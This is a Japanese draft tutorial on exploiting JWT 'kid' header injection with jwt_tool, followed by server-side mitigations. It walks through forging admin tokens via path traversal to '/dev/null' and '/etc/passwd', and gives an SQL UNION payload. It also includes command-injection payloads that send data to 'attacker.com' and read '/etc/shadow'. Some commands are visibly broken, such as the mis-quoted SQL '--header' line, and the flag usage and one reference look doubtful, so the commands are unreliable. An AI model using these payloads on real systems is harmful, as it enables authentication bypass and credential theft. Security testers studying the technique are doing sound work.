---
title: jwt_toolを使用したJWT Kidパラメータインジェクションテスト
description: jwt_toolセキュリティツールキットを使用した、JWT kid（Key ID）ヘッダーインジェクション攻撃の悪用と緩和に関する包括的なガイド。
created: 2026-06-22
tags:
  - jwt
  - security
  - vulnerability
  - injection
  - jwt_tool
  - testing
status: draft
---

# jwt_tool を使用した JWT Kid パラメータインジェクションのテスト

## JWT Kid インジェクションとは？

`kid`（Key ID）は、RFC 7515で定義されているオプションのヘッダーパラメータで、サーバーがJWT署名の検証に使用する暗号鍵を識別するのに役立ちます。アプリケーションが攻撃者から提供された無害化されていない`kid`値に基づいて動的に検証鍵を取得する場合、いくつかの重大な攻撃への道が開かれます：

- **パストラバーサル** – 攻撃者は`kid`を任意のファイルパス（例：`/dev/null`、`../../etc/passwd`）に設定します。サーバーはそのファイルを読み取り、その内容をそのままHMACシークレットとして使用するため、署名の偽造が可能になります。
- **SQLインジェクション** – データベースからキーを取得する場合（例：`SELECT key FROM keys WHERE kid='$kid'`）、攻撃者はSQLを注入して制御可能な値を返させることができます。
- **コマンドインジェクション / SSRF** – まれですが、`kid`がサニタイズされずにシェルコマンドや外部HTTPリクエストに渡された場合に発生します。

## なぜ重要か

`kid`インジェクションが成功すると、JWT認証が完全にバイパスされ、攻撃者は以下を実行できます：
- 任意のペイロード（例：`"role":"admin"`）を含むトークンの偽造
- 有効な資格情報なしでの権限昇格
- ユーザーアカウントや管理パネルの乗っ取り

この脆弱性は複数のCVEの原因となっており、現代のWebアプリケーションセキュリティ評価やCTFチャレンジでは定番となっています。

## jwt_toolの紹介

`jwt_tool`は、JSON Webトークンの監査、テスト、偽造のための強力なオープンソースツールキットです。アルゴリズムの混乱、`kid`インジェクション、ペイロードの改ざん、署名検証のバイパスなど、多くの一般的なJWT攻撃を自動化します。[ticarpi](https://github.com/ticarpi/jwt_tool)によって開発され、ペネトレーションテスターやセキュリティ研究者に広く使用されています。

## インストール

### オプション1: GitHubからクローン（推奨）

```bash
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
python3 -m pip install -r requirements.txt
```

Make the tool executable:

```bash
chmod +x jwt_tool.py
```

### オプション2: pipを使用したインストール（利用可能な場合）

```bash
pip install jwt-tool
```

> **注意:** GitHubバージョンはより頻繁に更新されています。ソースから実行する場合は常に最新のものをプルしてください。

## 基本的な使い方

`jwt_tool`は、ターゲットのJWTを指定してコマンドラインツールとして呼び出すことができます。一般的な構文は次のとおりです：

```bash
python3 jwt_tool.py <jwt_token> [options]
```

対話的なスキャンの場合：

```bash
python3 jwt_tool.py <jwt_token> -t
```

## jwt_toolを使用したKidインジェクションの悪用

### 1. Kidを介したパストラバーサル（最も一般的）

古典的な攻撃：`kid`を`/dev/null`や既知のファイルに設定し、空文字列またはファイルの内容でトークンに署名します。

**ステップ1 – JWTをスキャンしてkidパラメータを特定する**

```bash
python3 jwt_tool.py "eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQifQ.eyJzdWIiOiJ1c2VyIiwicm9sZSI6Im1lbWJlciJ9.sjKl7FhBfJ9J3wC6eVkIo4m7kA9nN3g"
```

出力には、`kid`を含むヘッダーとペイロードのクレームがハイライト表示されます。

**ステップ2 – kidインジェクションを使用したトークンの偽造**

`jwt_tool`は、`kid`インジェクション攻撃に`-X i`フラグを提供します。`-I`を使用してペイロードを編集し、`-pv`で新しい値を設定します。

```bash
python3 jwt_tool.py "eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQifQ.eyJzdWIiOiJ1c2VyIiwicm9sZSI6Im1lbWJlciJ9.sjKl7FhBfJ9J3wC6eVkIo4m7kA9nN3g" \
  -I \
  -pc "role" -pv "admin" \
  -X i \
  -k "/dev/null"
```

**説明：**
- `-I` : インタラクティブにペイロードクレームを変更します。
- `-pc "role" -pv "admin"` : `role`クレームを`"admin"`に変更します。
- `-X i` : `kid`インジェクションを実行します。
- `-k "/dev/null"` : キーファイルとして`/dev/null`を使用します。`jwt_tool`はそのファイルの内容（`/dev/null`の場合は空文字列）を使用してトークンに署名します。

ツールは新しく偽造されたJWTを出力します。サーバーが検証キーとして`/dev/null`を読み取る場合、このトークンを受け入れます。

**代替：`/etc/passwd`をシークレットとして使用**

```bash
python3 jwt_tool.py <original_token> \
  -I \
  -pc "role" -pv "admin" \
  -X i \
  -k "../../../etc/passwd"
```

サーバーが`/etc/passwd`を読み取ると、その内容全体をHMACシークレットとして使用します。`jwt_tool`は自動的にその内容で署名します。

### 2. Kidを介したSQLインジェクション

サーバーが`kid`値を使用してデータベースにキーを問い合わせる場合、既知の値を返すSQLペイロードを注入できます。

**例：`kid`を次のように設定したトークンを作成：**

```json
{
  "alg": "HS256",
  "kid": " ' UNION SELECT 'known_secret' -- "
}
```

`jwt_tool`にはSQLインジェクションの自動化機能は組み込まれていませんが、手動でヘッダーを作成し、`-X i`とカスタムキーを使用して署名することができます。

**カスタムヘッダーを使用した手動偽造：**

```bash
python3 jwt_tool.py <base_jwt> \
  -X i \
  -k "known_secret" \
  --header '{"alg":"HS256","kid":"' UNION SELECT 'known_secret' -- "}'
```

その後、必要に応じて`-I`でペイロードを調整します。

### 3. Kidを介したコマンドインジェクション

まれですが、`kid`がシェルコマンドに展開される場合に可能です。例：

```
curl https://keyserver.example.com/keys/$(kid)
```

`kid`をコマンドインジェクションペイロードに設定：

```json
"kid": "$(curl -s http://attacker.com/steal?)"
```

`jwt_tool`では任意のヘッダー値を含めることができます：

```bash
python3 jwt_tool.py <jwt> \
  --header '{"alg":"RS256","kid":"$(cat /etc/shadow | base64)"}' \
  -X i -k dummy_secret
```

> **注意:** 悪用の可能性はサーバーの実行環境と`kid`の処理方法に依存します。

## Kidインジェクションのためのjwt_toolの主要機能

| Feature | Command / Flag | Description |
|---------|---------------|-------------|
| Kid injection attack | `-X i` | 偽造された`kid`を設定し、ファイルベースのシークレットで署名するプロセスを自動化します。 |
| Algorithm confusion | `-X a` | `-X i`と組み合わせてハイブリッド攻撃を行います（公開鍵を取得した後にRS256からHS256に切り替え）。 |
| Payload tampering | `-I` / `-pc` / `-pv` | インタラクティブまたは非インタラクティブに任意のクレームを変更します。 |
| Custom key file | `-k <file>` | 偽造時にHMACシークレットとして使用されるファイルを指定します。 |
| Signature mismatch analysis | `-S` / `-s` | 変更された署名でトークンの動作を確認します。 |
| Database of known JWT secrets | `-C` | ブルートフォース中に一般的な弱いシークレットを試行します。 |
| Advanced header manipulation | `--header` | ヘッダーに任意のJSONを挿入します（生の`kid`ペイロードに便利）。 |

## すべてをまとめる：完全な悪用シナリオ

JWTを認証に使用する脆弱なAPIを考えます。サーバーは`kid`で指定されたファイルを読み取ることで検証鍵を取得します：

```python
# Vulnerable pseudocode
def verify_token(token):
    header = decode_header(token)
    kid = header['kid']
    with open('/keys/' + kid, 'r') as f:
        secret = f.read()
    return jwt.decode(token, secret, algorithms=['HS256'])
```

**ステップ1 – 偵察**

```bash
python3 jwt_tool.py "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImtpZCI6ImNsaWVudCJ9.eyJzdWIiOiJ1c2VyIn0.QPx..."
```

出力には`alg: RS256`、`kid: client`と表示されます。

**ステップ2 – パストラバーサルが可能か確認する**

`/dev/null`へのアクセスを試みる：

```bash
python3 jwt_tool.py <token> -X i -k /dev/null
```

サーバーが偽造されたトークンで200レスポンスを返した場合、脆弱性が確認されます。

**ステップ3 – 権限を昇格する**

```bash
# Forge token with admin role
python3 jwt_tool.py <original> \
  -I \
  -pc "role" -pv "admin" \
  -X i \
  -k "/dev/null"
```

**ステップ4 – 偽造したトークンを使用して保護されたリソースにアクセスする**

```bash
curl -H "Authorization: Bearer <forged_token>" https://api.target.com/admin
```

## 緩和策（サーバーサイド）

1. **許可されたKid値のホワイトリスト** – 既知の`kid`文字列とそれに対応する公開鍵のマッピングをハードコードします。ユーザー入力からキーを派生させないでください。
2. **Kid形式の検証** – 動的ルックアップが避けられない場合は、厳格な形式チェックを実施します。英数字のみ許可、パス区切り文字（`.`、`/`）を拒否、疑わしい文字を拒否します。
3. **ハードコードされたキーの使用** – 最も安全な方法は、期待される公開鍵をアプリケーションコードまたは設定ファイルに埋め込むことです。
4. **アルゴリズムの強制** – トークンで使用されているアルゴリズムが、その発行者に期待されるアルゴリズムと一致することを常に確認してください。`alg`ヘッダーを信頼しないでください。
5. **組み込みの保護機能を備えたJWTライブラリの採用** – `PyJWT`、`jsonwebtoken`、`jose`などの最新のライブラリは、未知の`kid`値を拒否したり、静的キーセットを要求するように設定できます。

## まとめ

`jwt_tool`は、JWTの`kid`インジェクションの脆弱性をテストするための不可欠なツールです。最も一般的な悪用経路を自動化し、セキュリティテスターに明確で再現性のあるワークフローを提供します。`-X i`フラグと`-I`フラグの使い方を理解することは、脆弱性を見逃すか、重大な認証バイパスを見つけるかの違いを生みます。

`kid`はサーバー側では **信頼できない入力** として扱うことを常に忘れないでください。開発者にとって、数行の入力検証でJWT攻撃のクラス全体を排除できます。

## 参考文献

- [github.com/ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
- [RFC 7515 – JSON Web Signature](https://datatracker.ietf.org/doc/html/rfc7515)
- [JWT Attacks (Part 4c): kid Header Injection](https://jwt.io/introduction/)
- [CVE-2018-0114](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0114) – node-jsonwebtoken key confusion
- [PortSwigger JWT Kid Lab](https://portswigger.net/web-security/jwt)